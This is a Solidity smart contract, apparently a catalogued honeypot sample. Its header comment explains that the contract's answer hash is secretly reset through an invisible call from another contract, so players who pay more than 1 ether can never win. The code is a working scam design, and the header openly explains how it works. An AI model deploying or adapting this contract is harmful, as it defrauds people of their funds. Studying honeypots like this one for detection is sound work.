/*
 * Title: Hidden Call
 * Trick: responseHash has been set to other values via message call from the other contract, which is invisible on Etherscan
 * Reference: https://etherscan.io/address/0x3CAF97B4D97276d75185aaF1DCf3A2A8755AFe27#codepragma
*/
contract G_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);  // cannot attack by a contract
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;
    address questionSender;
    bytes32 responseHash;

    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }

    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }

    function() public payable{}
}